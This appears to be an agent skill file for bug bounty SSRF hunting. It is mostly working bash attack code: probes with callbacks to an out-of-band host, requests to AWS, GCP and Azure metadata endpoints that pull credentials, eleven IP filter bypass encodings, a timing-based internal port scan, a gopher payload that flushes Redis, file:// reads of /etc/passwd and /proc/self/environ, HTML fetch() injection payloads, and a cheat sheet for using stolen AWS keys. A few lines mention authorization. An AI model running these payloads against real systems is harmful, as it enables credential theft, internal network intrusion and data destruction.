---
name: k1nzr3c0n-hunt-ssrf
description: "SSRF hunting skill built from 15 disclosed bug bounty reports. OOB-Or-It-Didn't-Happen gate enforced. Covers 11 IP bypass techniques, cloud metadata chains (AWS/GCP/Azure), gopher redirect, DNS rebinding, blind SSRF with interactsh/Burp Collaborator. Integrates with k1nzr3c0n JS analyst URL parameter output."
tags: [ssrf, hunt, web-security, bug-bounty, cloud]
report_count: 15
---

# K1NZR3C0N Hunt — SSRF

> **OOB-Or-It-Didn't-Happen**: DNS callback only is NOT a valid submission.
> You MUST demonstrate: internal data read OR cloud metadata access OR internal service interaction.

---

## Crown Jewels (Highest Payout SSRF)

```
Priority 1 — AWS/GCP/Azure metadata read (credentials → privilege escalation)
Priority 2 — Internal service interaction (Redis, Elasticsearch, internal API)
Priority 3 — gopher:// redirect to internal SMTP/Redis (code execution chain)
Priority 4 — File read via file:// protocol
Priority 5 — Internal network port scan (pivot)
```

---

## Phase 0 — Bootstrap & OOB Setup

```bash
TARGET="${TARGET:-}"
# CRITICAL: Set up OOB listener before testing
# Options: Burp Collaborator | interactsh | canarytokens.org
OOB="${OOB:-$(openssl rand -hex 8).oastify.com}"  # Burp Collaborator format
# Or: OOB="$(openssl rand -hex 8).oast.me"         # interactsh

HUNT="/tmp/hunt_ssrf_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"
echo "[+] Target : $TARGET"
echo "[+] OOB    : $OOB  ← configure this with Burp Collaborator or interactsh"
echo "[+] IMPORTANT: tag each payload with unique subdomain to correlate callbacks"
```

## Phase 1 — Signal Detection from Recon

```bash
echo "=== SSRF Attack Surface Signals ==="
RUNS_BASE="/app/runs"

# URL-accepting parameters from all endpoints
grep -rhoP 'https?://[^\s"]+[?&](?:url|link|src|href|image|img|avatar|icon|thumbnail|feed|webhook|callback|redirect|next|target|path|file|resource|load|fetch|proxy|curl|request|location)=[^\s&"]+' \
  "$RUNS_BASE" 2>/dev/null | sort -u | tee "$HUNT/ssrf_candidates.txt" | wc -l \
  | xargs echo "SSRF parameter candidates:"

echo ""
head -20 "$HUNT/ssrf_candidates.txt" | sed 's/^/  /'

echo ""
echo "=== PDF/Screenshot/Import Services (High SSRF Likelihood) ==="
grep -rhoP 'https?://[^\s"]+(?:pdf|screenshot|preview|thumbnail|import|export|render|convert)' \
  "$RUNS_BASE" 2>/dev/null | sort -u | sed 's/^/  /'

# From JS analyst: fetch() calls with user-controlled URL
JS_DIR="/tmp/hunt_js_${TARGET//[^a-zA-Z0-9]/_}/downloaded"
if [ -d "$JS_DIR" ]; then
  echo ""
  echo "=== fetch()/axios() URL parameters from JS analyst ==="
  grep -hoP '(?:fetch|axios\.(?:get|post))\s*\([^)]{0,200}(?:url|src|link|path|endpoint)[^)]{0,100}' \
    "$JS_DIR"/*.js 2>/dev/null | head -20 | sed 's/^/  /'
fi
```

## Phase 2 — Basic SSRF Probe

```bash
echo "=== SSRF Basic Detection ==="

# Each test uses unique OOB subdomain for correlation
PROBE_ID=$(openssl rand -hex 4)

# Test URL parameters from candidates
for EP in $(head -10 "$HUNT/ssrf_candidates.txt"); do
  # Extract the parameter name
  PARAM=$(echo "$EP" | grep -oP '(?<=\?|&)[a-zA-Z_-]+(?==)')
  BASE=$(echo "$EP" | grep -oP 'https?://[^\?]+')
  
  echo "Testing: $BASE?$PARAM=http://${PROBE_ID}.${OOB}"
  curl -sk -o /dev/null -m 5 "${BASE}?${PARAM}=http://${PROBE_ID}.${OOB}" \
    -H "Cookie: ${ACCT1_COOKIE:-}" -w "  → HTTP %{http_code}, %{time_total}s\n"
done

echo ""
echo "[!] Check your OOB listener for DNS/HTTP callbacks from: ${PROBE_ID}.${OOB}"
echo "[!] DNS-only callback = evidence of SSRF, but NOT submittable alone"
echo "[!] HTTP callback with data = submittable"
```

## Phase 3 — Cloud Metadata (Critical Path)

```bash
echo "=== Cloud Metadata Endpoint Testing ==="
# If SSRF confirmed, escalate to metadata immediately

SSRF_EP="${SSRF_ENDPOINT:-}"  # e.g. https://target.com/api/fetch?url=

if [ -z "$SSRF_EP" ]; then
  echo "Set SSRF_ENDPOINT=https://target.com/endpoint?url= first"
fi

# AWS IMDSv1 (no auth required — instant creds)
AWS_TARGETS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
  "http://169.254.169.254/latest/user-data"
  "http://169.254.169.254/latest/meta-data/hostname"
  # IMDSv2 token first
  "http://169.254.169.254/latest/api/token"
)

# GCP metadata (requires header)
GCP_TARGETS=(
  "http://metadata.google.internal/computeMetadata/v1/instance/"
  "http://metadata.google.internal/computeMetadata/v1/project/project-id"
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
)

# Azure metadata (requires header)
AZURE_TARGETS=(
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/"
)

echo "--- AWS IMDSv1 ---"
for META in "${AWS_TARGETS[@]}"; do
  RESP=$(curl -sk -m 5 "${SSRF_EP}$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$META" 2>/dev/null)")
  [ -n "$RESP" ] && echo "  [HIT] $META" && echo "  → ${RESP:0:100}"
done

echo ""
echo "--- GCP Metadata (with Metadata-Flavor header) ---"
for META in "${GCP_TARGETS[@]}"; do
  RESP=$(curl -sk -m 5 "${SSRF_EP}$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$META" 2>/dev/null)" \
    -H "Metadata-Flavor: Google")
  [ -n "$RESP" ] && echo "  [HIT] $META" && echo "  → ${RESP:0:100}"
done

echo ""
echo "--- Azure IMDS ---"
for META in "${AZURE_TARGETS[@]}"; do
  RESP=$(curl -sk -m 5 "${SSRF_EP}$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$META" 2>/dev/null)" \
    -H "Metadata: true")
  [ -n "$RESP" ] && echo "  [HIT] $META" && echo "  → ${RESP:0:100}"
done
```

## Phase 4 — IP Restriction Bypass (11 Techniques)

```bash
echo "=== Blocked? Try IP Bypass Techniques ==="
TARGET_INTERNAL="169.254.169.254"  # or 127.0.0.1 for localhost

BYPASSES=(
  # 1. Decimal encoding
  "http://2852039166/"                   # 169.254.169.254 decimal
  "http://2130706433/"                   # 127.0.0.1 decimal
  # 2. Octal encoding
  "http://0251.0376.0251.0376/"         # 169.254.169.254 octal
  "http://0177.0.0.01/"                 # 127.0.0.1 octal
  # 3. Hex encoding
  "http://0xa9fea9fe/"                  # 169.254.169.254 hex
  "http://0x7f000001/"                  # 127.0.0.1 hex
  # 4. Mixed encoding
  "http://169.254.169.254/"
  "http://169.254.0xA9FE/"
  # 5. IPv6
  "http://[::ffff:169.254.169.254]/"
  "http://[::ffff:a9fe:a9fe]/"
  # 6. URL parsing confusion
  "http://foo@169.254.169.254/"
  "http://169.254.169.254:80/"
  # 7. DNS rebinding via spoofed record
  "http://${OOB}/"                       # Rebind to 169.254.169.254 server-side
  # 8. Localhost aliases
  "http://localhost/"
  "http://localtest.me/"
  "http://lvh.me/"
  # 9. CNAME to internal
  "http://internal.${TARGET}/"
  # 10. Redirect via open redirect
  "https://${TARGET}/redirect?url=http://169.254.169.254/"
  # 11. Protocol switch
  "dict://169.254.169.254:80/"
  "sftp://169.254.169.254:22/"
)

for BYPASS in "${BYPASSES[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$BYPASS" 2>/dev/null)
  RESP=$(curl -sk -m 3 "${SSRF_EP}${ENCODED}" 2>/dev/null)
  RESP_LEN=${#RESP}
  [ "$RESP_LEN" -gt 20 ] && echo "  [HIT ${RESP_LEN}b] $BYPASS" && echo "  → ${RESP:0:80}"
done
```

## Phase 5 — Blind SSRF with Internal Service Interaction

```bash
echo "=== Blind SSRF: Internal Port Scan ==="
# Use response timing to detect open ports (>3x slower = open)
SSRF_EP="${SSRF_ENDPOINT:-}"

for PORT in 22 25 80 443 3306 5432 6379 8080 8443 8500 9200 9300 27017; do
  TIME=$(curl -sk -m 5 -o /dev/null -w '%{time_total}' \
    "${SSRF_EP}http://127.0.0.1:${PORT}/" 2>/dev/null)
  printf "  Port %5s: %ss\n" "$PORT" "$TIME"
done

echo ""
echo "=== gopher:// Protocol Attack (Redis/SMTP) ==="
# gopher allows sending raw bytes to internal services
# Redis: FLUSHALL then SET
REDIS_GOPHER="gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aFLUSHALL%0d%0a"
echo "  Redis attack: ${SSRF_EP}${REDIS_GOPHER}"
echo "  [!] Do NOT execute without explicit authorization — informational only"

echo ""
echo "=== file:// Protocol ==="
FILE_TARGETS=(
  "file:///etc/passwd"
  "file:///etc/hosts"
  "file:///proc/self/environ"
  "file:///app/config.py"
  "file:///app/.env"
)
for F in "${FILE_TARGETS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$F" 2>/dev/null)
  RESP=$(curl -sk -m 5 "${SSRF_EP}${ENCODED}" 2>/dev/null)
  [ -n "$RESP" ] && echo "  [FILE HIT] $F" && echo "  ${RESP:0:100}"
done
```

## Phase 6 — SSRF via PDF/Image Rendering

```bash
echo "=== SSRF via Rendering Endpoints ==="
# Many PDF/screenshot services fetch the URL server-side

# Inject into HTML fields that get rendered
PAYLOADS=(
  "<script>fetch('http://${OOB}/${TARGET}')</script>"
  "<img src='http://${OOB}/${TARGET}'>"
  "<iframe src='http://169.254.169.254/latest/meta-data/'>"
  "<link rel='stylesheet' href='http://${OOB}/${TARGET}'>"
)

# Test PDF generation endpoint
PDF_EP=$(grep -rhoP 'https?://[^\s"]+(?:pdf|generate|export|render|print|convert)' \
  "/app/runs" 2>/dev/null | head -1)
if [ -n "$PDF_EP" ]; then
  echo "PDF endpoint found: $PDF_EP"
  echo "Test with: POST ${PDF_EP} body={url: 'http://${OOB}/pdf_test'}"
fi
```

## Phase 7 — Gate 0 Validation

```bash
echo "=== SSRF Gate 0 Checklist ==="
echo ""
echo "  □ OOB callback received (HTTP or DNS)"
echo "  □ If DNS only: NOT submittable — need HTTP body or internal data"
echo "  □ Cloud metadata read: show AccessKeyId/SecretAccessKey OR project data"
echo "  □ Internal service: show banner/data from internal port"
echo "  □ Each request tagged with unique subdomain (not shared OOB domain)"
echo "  □ Response time analysis: ≥10 trials, mean ≥2σ above control"
echo "  □ IP used is confirmed to be internal (not public CDN/proxy)"
echo ""
echo "  /skill k1nzr3c0n-triage → 7Q gate before submitting"
```

---

## Report Title Formula

```
SSRF in [/api/fetch?url=] allows reading AWS instance metadata and credential theft
Blind SSRF in [image rendering endpoint] enables internal network port scanning
SSRF via PDF generation allows reading /etc/passwd via file:// protocol
```

## Evidence Required

```
1. Original request with SSRF payload
2. OOB server log showing HTTP callback (not just DNS)
3. Response body showing internal data (metadata, file contents, service banner)
4. For AWS creds: show the AccessKeyId, SecretAccessKey (redact after confirming)
5. Demonstrate impact: what can attacker DO with the internal access?
```

---

## Cheat Sheet: AWS Credential Use (Severity Escalation Proof)

```bash
# If you got AWS creds from SSRF, demonstrate escalation (in authorized test only):
AWS_KEY="AKIA..."
AWS_SECRET="..."
AWS_TOKEN="..."  # session token if temporary creds

# List accessible S3 buckets (shows blast radius)
AWS_ACCESS_KEY_ID="$AWS_KEY" \
AWS_SECRET_ACCESS_KEY="$AWS_SECRET" \
AWS_SESSION_TOKEN="$AWS_TOKEN" \
aws s3 ls 2>&1 | head -20

# Show role permissions
AWS_ACCESS_KEY_ID="$AWS_KEY" \
  aws sts get-caller-identity 2>&1
```
